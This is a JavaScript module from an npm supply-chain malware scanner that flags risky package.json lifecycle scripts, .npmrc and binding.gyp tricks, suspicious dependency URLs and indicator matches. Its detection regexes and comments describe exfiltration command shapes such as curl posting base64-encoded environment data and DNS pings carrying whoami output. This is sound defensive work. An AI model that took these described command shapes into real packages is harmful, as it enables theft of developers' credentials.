const fs = require('fs');
const path = require('path');
const { loadCachedIOCs } = require('../ioc/updater.js');

const SUSPICIOUS_SCRIPTS = [
  'preinstall',
  'install',
  'postinstall',
  'preuninstall',
  'postuninstall',
  'prepare',
  'prepack'
];

const DANGEROUS_PATTERNS = [
  { pattern: /curl\s+.*\|.*sh/, name: 'curl_pipe_sh' },
  { pattern: /wget\s+.*\|.*sh/, name: 'wget_pipe_sh' },
  { pattern: /eval\s*\(/, name: 'eval_usage' },
  { pattern: /child_process/, name: 'child_process' },
  { pattern: /\.npmrc/, name: 'npmrc_access' },
  { pattern: /GITHUB_TOKEN/, name: 'github_token_access' },
  { pattern: /AWS_/, name: 'aws_credential_access' },
  { pattern: /base64/, name: 'base64_encoding' },
  { pattern: /require\s*\(\s*['"]https?['"]\)/, name: 'network_require' },
  { pattern: /node\s+-e\s/, name: 'node_inline_exec' }
];

const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype', 'toString', 'valueOf']);
const DEP_FP_WHITELIST = new Set(['es5-ext', 'bootstrap-sass']);

// System commands that should never be shadowed via the "bin" field (PATH hijack)
const SHADOWED_COMMANDS = new Set([
  'node', 'npm', 'npx', 'git', 'sh', 'bash', 'zsh', 'python', 'python3',
  'curl', 'wget', 'ssh', 'scp', 'tar', 'make', 'gcc', 'go', 'ruby',
  'perl', 'php', 'java', 'javac', 'pip', 'pip3', 'yarn', 'pnpm', 'bun'
]);

/**
 * Clean a version specifier to extract the primary version number.
 * Handles: ^1.0.0, ~1.0.0, >=1.0.0, >=1.0.0,<2.0.0, git URLs, etc.
 * @param {string} versionSpec - Raw version from package.json
 * @returns {string} Cleaned version or original string
 */
function cleanVersionSpec(versionSpec) {
  if (!versionSpec || typeof versionSpec !== 'string') return '';
  // Skip git URLs, file paths, URLs entirely (not matchable to IOC versions)
  if (/^(git[+:]|github:|https?:|file:|\/)/.test(versionSpec)) return '';
  // Handle range specifiers like ">=1.0.0,<2.0.0" — extract the first version
  const rangeMatch = versionSpec.match(/[\^~>=<!\s]*(\d+\.\d+[.\d-a-zA-Z]*)/);
  return rangeMatch ? rangeMatch[1] : versionSpec.replace(/^[\^~>=<! ]+/, '');
}

async function scanPackageJson(targetPath) {
  const threats = [];
  const pkgPath = path.join(targetPath, 'package.json');

  if (!fs.existsSync(pkgPath)) {
    return threats;
  }

  let pkg;
  try {
    pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
  } catch (e) {
    console.log('[WARN] Failed to parse package.json: ' + e.message);
    return threats;
  }
  const scripts = pkg.scripts || {};

  // Scan lifecycle scripts
  for (const scriptName of SUSPICIOUS_SCRIPTS) {
    if (scripts[scriptName]) {
      const scriptContent = scripts[scriptName];

      threats.push({
        type: 'lifecycle_script',
        severity: 'MEDIUM',
        message: `Script "${scriptName}" detected: ${scriptContent.substring(0, 200)}`,
        file: 'package.json'
      });

      for (const { pattern, name } of DANGEROUS_PATTERNS) {
        if (pattern.test(scriptContent)) {
          threats.push({
            type: name,
            severity: 'HIGH',
            message: `Dangerous pattern "${name}" in script "${scriptName}".`,
            file: 'package.json'
          });
        }
      }

      // Escalate: lifecycle script (preinstall/install/postinstall) + shell pipe → CRITICAL
      if (['preinstall', 'install', 'postinstall'].includes(scriptName)) {
        if (/curl\s.*\|\s*(sh|bash)\b/.test(scriptContent) ||
            /wget\s.*\|\s*(sh|bash)\b/.test(scriptContent)) {
          threats.push({
            type: 'lifecycle_shell_pipe',
            severity: 'CRITICAL',
            message: `Critical: "${scriptName}" pipes remote code to shell — supply chain RCE.`,
            file: 'package.json'
          });
        }
      }

      // Escalate: lifecycle script targeting node_modules/ — payload hiding technique.
      // Legitimate postinstall scripts run from the package's own directory, not from node_modules/.
      // Lazarus/DPRK interview attacks hide payloads in node_modules/.cache/ or similar paths.
      if (['preinstall', 'install', 'postinstall'].includes(scriptName) &&
          /\bnode_modules[/\\]/.test(scriptContent)) {
        threats.push({
          type: 'lifecycle_hidden_payload',
          severity: 'CRITICAL',
          message: `Critical: "${scriptName}" targets file inside node_modules/ — payload hiding technique to evade scanners.`,
          file: 'package.json'
        });
      }

      // v2.10.89: curl/wget + env/base64 exfiltration in lifecycle scripts
      // Catches: apache-arrow-14 (score 9→CRITICAL), @signals-notebook (score 9→CRITICAL)
      // Pattern: curl -d $(env|base64) URL, curl -X POST URL?env=$(env|base64 -w0)
      // v2.10.94: extended to ping/nslookup/dig/host/getent — DNS exfil variants.
      // Catches: koa-v3@9.4.0 which uses `ping -c 1 $(whoami).<hex>.oast.fun` instead of curl.
      if (['preinstall', 'install', 'postinstall'].includes(scriptName) &&
          /\b(curl|wget|ping|nslookup|dig|host|getent)\b/.test(scriptContent) &&
          (/\$\(.*\b(env|id|whoami|uname|hostname)\b/.test(scriptContent) ||
           (/\bbase64\b/.test(scriptContent) && !/\|\s*(sh|bash)\b/.test(scriptContent)))) {
        // Exclude curl|sh which is already caught by lifecycle_shell_pipe
        threats.push({
          type: 'curl_env_exfil',
          severity: 'CRITICAL',
          message: `Critical: "${scriptName}" uses DNS/HTTP exfil tool (curl/wget/ping/nslookup/dig) with env/base64 payload — credential theft via lifecycle script.`,
          file: 'package.json'
        });
      }

      // Detect Bun runtime evasion in lifecycle scripts (Shai-Hulud 2.0)
      if (/\bbun\s+(run|exec|install|x)\b/.test(scriptContent) || /\bbunx\s+/.test(scriptContent)) {
        threats.push({
          type: 'bun_runtime_evasion',
          severity: 'HIGH',
          message: `Bun runtime invocation in lifecycle script "${scriptName}" — alternative runtime to evade Node.js monitoring/sandboxing.`,
          file: 'package.json'
        });
      }

      // Blue Team v8b (B8): Lifecycle script references non-existent file in package
      // Pattern: "node path/to/script.js" where the file does not exist — phantom install script
      // Strong signal: preinstall/install scripts pointing to missing files can't be build artifacts
      if (['preinstall', 'install', 'postinstall'].includes(scriptName)) {
        const nodeFileMatch = scriptContent.match(/^node\s+(\S+)/);
        if (nodeFileMatch) {
          const scriptFile = nodeFileMatch[1];
          const fullScriptPath = path.join(targetPath, scriptFile);
          if (!fs.existsSync(fullScriptPath) && !fs.existsSync(fullScriptPath + '.js')) {
            threats.push({
              type: 'lifecycle_missing_script',
              severity: scriptName === 'postinstall' ? 'HIGH' : 'CRITICAL',
              message: `Lifecycle "${scriptName}" references "${scriptFile}" which does not exist in the package — phantom install script, payload may be injected at publish time.`,
              file: 'package.json'
            });
          }
        }
      }
    }
  }

  // v2.10.89: Dependency confusion indicator — version >= 99 with install hooks
  // Catches: @corpweb-ui/wmkt-library, @toprank/partner, @adac-fahrzeugplattform/ui
  const versionStr = pkg.version || '';
  const majorVersion = parseInt(versionStr.split('.')[0], 10);
  if (majorVersion >= 99) {
    const hasInstallHook = ['preinstall', 'install', 'postinstall'].some(s => scripts[s]);
    if (hasInstallHook) {
      threats.push({
        type: 'version_99_preinstall',
        severity: 'HIGH',
        message: `Version ${versionStr} (major >= 99) with lifecycle hook — dependency confusion attack pattern.`,
        file: 'package.json'
      });
    }
  }

  // Check non-lifecycle scripts (test, start, etc.) for network exfil commands
  const NETWORK_SCRIPT_PATTERN = /\bcurl\b|\bwget\b|\bnc\s+-|\bncat\b|\bpowershell\b|\bnslookup\b/;
  for (const [scriptName, scriptContent] of Object.entries(scripts)) {
    if (SUSPICIOUS_SCRIPTS.includes(scriptName)) continue; // already checked above
    if (typeof scriptContent !== 'string') continue;
    if (NETWORK_SCRIPT_PATTERN.test(scriptContent)) {
      threats.push({
        type: 'lifecycle_script',
        severity: 'MEDIUM',
        message: `Script "${scriptName}" contains network command (curl/wget/nc/nslookup). Unusual for "${scriptName}".`,
        file: 'package.json'
      });
    }
  }

  // Detect bin field hijacking: shadowing system commands (node, npm, git, bash, etc.)
  if (pkg.bin) {
    const binEntries = typeof pkg.bin === 'string'
      ? { [pkg.name]: pkg.bin }
      : pkg.bin;
    for (const [cmdName, cmdPath] of Object.entries(binEntries || {})) {
      if (SHADOWED_COMMANDS.has(cmdName)) {
        // Skip when the package IS the legitimate provider of the command:
        // 1. Self-name: npm→bin.npm, yarn→bin.yarn
        // 2. Sibling commands: npm also provides npx → pkg.name in SHADOWED_COMMANDS
        // Typosquats still caught: 'nmp' declaring bin.npm → 'nmp' not in SHADOWED_COMMANDS → fires
        if (cmdName === pkg.name || SHADOWED_COMMANDS.has(pkg.name)) continue;
        threats.push({
          type: 'bin_field_hijack',
          severity: 'CRITICAL',
          message: `package.json "bin" field shadows system command "${cmdName}" → ${cmdPath}. PATH hijack: all npm scripts will execute this instead of the real ${cmdName}.`,
          file: 'package.json'
        });
      }
    }
  }

  // Detect .npmrc with git= override (PackageGate technique)
  const npmrcPath = path.join(targetPath, '.npmrc');
  if (fs.existsSync(npmrcPath)) {
    try {
      const npmrcContent = fs.readFileSync(npmrcPath, 'utf8');
      if (/^git\s*=/m.test(npmrcContent)) {
        threats.push({
          type: 'npmrc_git_override',
          severity: 'CRITICAL',
          message: '.npmrc contains git= override — PackageGate technique: replaces git binary with attacker-controlled script.',
          file: '.npmrc'
        });
      }
    } catch { /* permission error */ }
  }

  // Blue Team v8: binding.gyp + lifecycle script = native addon install risk
  // binding.gyp triggers node-gyp compilation during install. Combined with lifecycle scripts
  // that aren't standard node-gyp build tools, this indicates potentially malicious native code.
  const bindingGypPath = path.join(targetPath, 'binding.gyp');
  if (fs.existsSync(bindingGypPath)) {
    const hasInstallLifecycle = ['preinstall', 'install', 'postinstall'].some(s => scripts[s]);
    const installScript = scripts.install || scripts.postinstall || scripts.preinstall || '';
    // node-gyp rebuild / prebuild-install / cmake-js are legitimate native addon builders
    const isStandardBuild = /\b(node-gyp|prebuild|cmake-js|napi|prebuildify|neon)\b/i.test(installScript);

    // Blue Team v8b (C7): Check binding.gyp content for shell commands in actions
    let gypContent = '';
    try { gypContent = fs.readFileSync(bindingGypPath, 'utf8'); } catch {}
    const hasShellActions = /\baction\b.*\bsh\b/.test(gypContent) || /\bcurl\b/.test(gypContent) ||
      /\bwget\b/.test(gypContent) || /\$\(whoami\)/.test(gypContent) || /\$\(uname/.test(gypContent);
    // Check if binding.gyp references C/C++ source files
    const hasNativeSources = /\.(c|cc|cpp|cxx|h|hpp)\b/.test(gypContent);

    // Phantom Gyp (June 2026): GYP command-substitution <!(...) / <!@(...) runs a command at
    // *configure* time via `node-gyp`, which npm auto-runs on install whenever a binding.gyp is
    // present — NO package.json lifecycle script required, so it slips past every lifecycle-gated
    // check below. Distinct from <(...) / <@(...) (plain variable expansion, benign) which MUST
    // NOT fire — the required `!` gates command execution.
    //
    // Legit native addons use <!(...) heavily for build-env queries — `node -p process.versions`,
    // `node ./util/has_lib.js`, `pkg-config ... | sed`, `node -p "require('node-addon-api').include"`
    // — and a build-helper `<!(node x.js)` is statically INDISTINGUISHABLE from a payload
    // `<!(node index.js)`. To honor "FPR must never increase" we flag a command-sub ONLY when it
    // carries a malice-specific marker, never the bare "runs a script" shape:
    //   (1) GYP_DANGER — shell-level malice in the command line itself: the Phantom Gyp fake-source
    //       trick (`; / && / | echo <name>.c`, returning a fabricated source so node-gyp doesn't
    //       error), network fetch (curl/wget), pipe-to-shell (| sh, sh -c), eval/base64//dev/tcp,
    //       char-code obfuscation (fromCharCode/atob);
    //   (2) an inline interpreter payload — node|python|ruby|perl running -e/-c/-p/--eval/--print code
    //       that reaches the NETWORK (require/import of https|http|net|dgram|dns|tls, optional node:
    //       prefix; fetch; urllib/requests/httpx/http.client/urlopen; socket). Network at configure
    //       time is never a legit build query. We deliberately do NOT key on child_process/exec/spawn
    //       here — legit addons shell out to detect the toolchain (`node -e "...execSync('gcc
    //       --version')..."`), which would FP; an exec of curl/wget is still caught by GYP_DANGER.
    //       Catches `<!(node --eval require('node:https')...)`, `<!(python3 -c import requests)`.
    // Honest limitation: this is a line-by-line SPEED-BUMP, not coverage. A bare `<!(node payload.js)`
    // and any non-network inline payload are NOT flagged (indistinguishable from canvas/node-sass
    // build helpers without false positives, FPR-first by design). Real closure needs a compound
    // (configure-time sink × the run script's AST/dataflow verdict) — a separate effort.
    const GYP_DANGER = /[;&|]\s*echo\s+[^|;&]*\.(?:c|cc|cpp|cxx|m|mm|cs)\b|\bcurl\b|\bwget\b|\|\s*(?:sh|bash|zsh)\b|\b(?:sh|bash|zsh)\s+-c\b|\beval\b|\bbase64\b|\/dev\/tcp|fromCharCode|\batob\b/i;
    const GYP_INTERP = /\b(?:node|nodejs|python[0-9.]*|ruby|perl)\b[^|;&\n]{0,40}?\s--?(?:eval|print|e|c|p)\b/i;
    const GYP_PAYLOAD_API = /(?:require|import)\s*\(\s*['"](?:node:)?(?:https?|net|dgram|dns|tls)['"]|\bfetch\s*\(|\burllib\b|\brequests\b|\bhttpx\b|http\.client|\burlopen\b|socket\.(?:socket|create_connection)/i;
    let gypCommandExec = false;
    const gypCmdSubRe = /<!@?\(([^\n]{0,400})/g;
    let _gm;
    while ((_gm = gypCmdSubRe.exec(gypContent)) !== null) {
      const body = _gm[1];
      if (GYP_DANGER.test(body) || (GYP_INTERP.test(body) && GYP_PAYLOAD_API.test(body))) { gypCommandExec = true; break; }
    }
    if (gypCommandExec) {
      threats.push({
        type: 'gyp_command_exec',
        severity: 'CRITICAL',
        message: `binding.gyp uses GYP command-substitution (<!(...) / <!@(...)) running a non-build command at install time via node-gyp, no lifecycle script required (Phantom Gyp pattern).`,
        file: 'binding.gyp'
      });
    }

    if (hasShellActions) {
      threats.push({
        type: 'native_addon_install',
        severity: 'CRITICAL',
        message: `binding.gyp contains shell commands in build actions (curl/sh/whoami) — build-time code execution and exfiltration.`,
        file: 'binding.gyp'
      });
    } else if (hasInstallLifecycle && !isStandardBuild) {
      threats.push({
        type: 'native_addon_install',
        severity: 'HIGH',
        message: `binding.gyp present with non-standard lifecycle script: "${installScript.substring(0, 100)}" — potential malicious native compilation.`,
        file: 'package.json'
      });
    } else if (hasInstallLifecycle && hasNativeSources) {
      // Standard build but with native C/C++ sources — HIGH (native code is opaque)
      threats.push({
        type: 'native_addon_install',
        severity: 'HIGH',
        message: `binding.gyp with C/C++ source files + lifecycle script — native addon compilation. Native code is opaque to static analysis.`,
        file: 'package.json'
      });
    } else if (hasInstallLifecycle) {
      // Standard build tool — informational only
      threats.push({
        type: 'native_addon_install',
        severity: 'LOW',
        message: 'binding.gyp with standard build tool (node-gyp/prebuild) in lifecycle script — legitimate native addon.',
        file: 'package.json'
      });
    }
  }

  // Scan declared dependencies against IOCs
  let iocs;
  try {
    iocs = loadCachedIOCs();
  } catch (e) {
    console.log('[WARN] Failed to load IOCs: ' + e.message);
    return threats;
  }
  const allDeps = {};
  const depSources = [pkg.dependencies, pkg.devDependencies, pkg.optionalDependencies, pkg.peerDependencies];
  for (const src of depSources) {
    if (!src || typeof src !== 'object') continue;
    for (const [key, value] of Object.entries(src)) {
      if (!DANGEROUS_KEYS.has(key)) allDeps[key] = value;
    }
  }
  // bundledDependencies is an array of package names, not an object
  if (Array.isArray(pkg.bundledDependencies)) {
    for (const name of pkg.bundledDependencies) {
      if (typeof name === 'string' && !DANGEROUS_KEYS.has(name)) allDeps[name] = allDeps[name] || '*';
    }
  }

  for (const [depName, depVersion] of Object.entries(allDeps)) {
    if (DANGEROUS_KEYS.has(depName)) continue;
    // Skip local dependencies (link:, file:, workspace:) — they're local code, not npm packages
    if (typeof depVersion === 'string' && /^(link:|file:|workspace:)/.test(depVersion)) continue;
    // Skip npm alias syntax (e.g. "npm:typescript@^3.1.6") — alias name is virtual, not a real package
    if (typeof depVersion === 'string' && depVersion.startsWith('npm:')) continue;
    // Detect suspicious dependency URLs (HTTP/HTTPS instead of version)
    if (typeof depVersion === 'string' && /^https?:\/\//.test(depVersion)) {
      const urlLower = depVersion.toLowerCase();
      const isSuspicious = [
        /ngrok\.io/, /ngrok-free\.app/, /ngrok\.app/,
        /localtunnel\.me/, /loca\.lt/, /serveo\.net/, /bore\.digital/,
        /trycloudflare\.com/, /localhost\.run/,
        /\/\/localhost[:/]/, /\/\/127\.0\.0\.1[:/]/, /\/\/0\.0\.0\.0[:/]/,
        /\/\/10\.\d{1,3}\.\d{1,3}\.\d{1,3}[:/]/,
        /\/\/192\.168\.\d{1,3}\.\d{1,3}[:/]/,
        /\/\/172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}[:/]/
      ].some(p => p.test(urlLower));

      // v2.10.93: External raw tarball URL as dep — ltidi chain attack pattern.
      // GitHub/GitLab/Bitbucket release tarballs are legitimate; everything else
      // pointing to .tgz/.tar.gz/.zip is payload delivery via third-party storage
      // (GCS, S3, CDNs). The stub package bypasses all lifecycle/obfuscation scanners
      // because the malicious code lives in the external tarball fetched at install.
      const isTarballUrl = /\.(tgz|tar\.gz|tar\.bz2|zip)(\?|#|$)/.test(urlLower);
      const isLegitTarballHost = [
        /\/\/github\.com\//,
        /\/\/codeload\.github\.com\//,
        /\/\/objects\.githubusercontent\.com\//,
        /\/\/gitlab\.com\//,
        /\/\/bitbucket\.org\//,
        /\/\/registry\.npmjs\.org\//,
        /\/\/registry\.yarnpkg\.com\//
      ].some(p => p.test(urlLower));
      const isExternalTarball = isTarballUrl && !isLegitTarballHost;

      let severity;
      let note;
      if (isSuspicious) {
        severity = 'CRITICAL';
        note = ' (tunnel/private/localhost)';
      } else if (isExternalTarball) {
        severity = 'CRITICAL';
        note = ' (external raw tarball on third-party host — chain attack pattern, npm registry audit bypass)';
      } else {
        severity = 'HIGH';
        note = ' (unusual, verify source)';
      }

      // v2.10.94: External tarball on third-party host emits a distinct type
      // so MT-1 score ceiling (caps non-lifecycle, non-HC packages at 35) can be
      // bypassed via HIGH_CONFIDENCE_MALICE_TYPES. ltidi stubs have no install
      // hooks, so the dep URL is the only signal and must be HC-classified.
      const threatType = isExternalTarball ? 'external_tarball_dep' : 'dependency_url_suspicious';
      threats.push({
        type: threatType,
        severity,
        message: `Dependency "${depName}" uses HTTP URL: ${depVersion}${note}`,
        file: 'package.json'
      });
    }
    // Detect git-based dependencies — potential PackageGate RCE vector
    // Covers git+https://, git://, and platform shorthands (github:, gitlab:, bitbucket:)
    // which resolve to git repos and execute lifecycle hooks (prepare) on install.
    // Mini Shai-Hulud campaign (2026-05): github:tanstack/router#commit exploited the
    // prepare hook to execute tanstack_runner.js.
    if (typeof depVersion === 'string' && /^(?:git[+:]|github:|gitlab:|bitbucket:)/.test(depVersion)) {
      threats.push({
        type: 'git_dependency_rce',
        severity: 'HIGH',
        message: `Dependency "${depName}" uses git URL: ${depVersion} — potential PackageGate RCE vector (malicious .npmrc can override git binary).`,
        file: 'package.json'
      });
    }
    // Skip known FP packages that share names with malicious IOC entries
    if (DEP_FP_WHITELIST.has(depName)) continue;
    let malicious = null;

    // Use optimized Map for O(1) lookup if available
    if (iocs.packagesMap) {
      if (iocs.wildcardPackages && iocs.wildcardPackages.has(depName)) {
        const pkgList = iocs.packagesMap.get(depName);
        malicious = pkgList ? pkgList.find(p => p.version === '*') : null;
      } else if (iocs.packagesMap.has(depName)) {
        const pkgList = iocs.packagesMap.get(depName);
        const cleanVersion = cleanVersionSpec(depVersion);
        malicious = pkgList.find(p => p.version === cleanVersion || p.version === depVersion);
      }
    } else if (iocs.packages) {
      // Fallback: linear search for compatibility
      malicious = iocs.packages.find(p => {
        if (p.name !== depName) return false;
        if (p.version === '*') return true;
        const cleanVersion = cleanVersionSpec(depVersion);
        if (p.version === cleanVersion || p.version === depVersion) return true;
        return false;
      });
    }

    if (malicious) {
      // C1: Include triggering dependency metadata for diagnostic
      // Use distinct type for dependency-declared IOC matches (not the package itself)
      // so they don't bypass all downstream filtering via IOC_MATCH_TYPES
      threats.push({
        type: 'dependency_ioc_match',
        severity: 'HIGH',
        message: `Malicious dependency declared: ${depName}@${depVersion} (source: ${malicious.source || 'IOC'})`,
        file: 'package.json',
        matchedDep: depName,
        matchedVersion: malicious.version,
        iocSource: malicious.source || 'IOC'
      });
    }
  }

  return threats;
}

module.exports = { scanPackageJson };